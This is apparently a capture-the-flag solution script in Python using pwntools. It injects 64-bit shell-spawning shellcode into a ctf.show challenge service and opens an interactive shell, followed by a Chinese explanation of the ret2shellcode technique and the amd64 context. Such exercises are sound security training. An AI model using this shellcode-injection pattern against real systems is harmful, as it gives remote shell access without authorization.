from pwn import *

context(arch = 'amd64', os = 'linux')

p = remote('pwn.challenge.ctf.show', 28286)

shellcode = asm(shellcraft.sh())

p.sendlineafter('Attach it!\n', shellcode)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2shellcode - 64位基础版本
2. 与32位的区别：
   - 需要显式设置context(arch='amd64')
   - shellcraft.sh()生成64位shellcode
3. context设置：
   - arch='amd64'：指定64位架构
   - os='linux'：指定Linux系统
   - 影响asm()和shellcraft()的行为
4. 64位shellcode特点：
   - 使用64位寄存器（rax, rdi, rsi等）
   - 系统调用号不同（execve=59）
   - 指令编码不同
5. 利用流程与32位相同：
   - 生成shellcode
   - 发送到栈上
   - 跳转到shellcode执行
6. 关键点：64位shellcode的context设置
"""
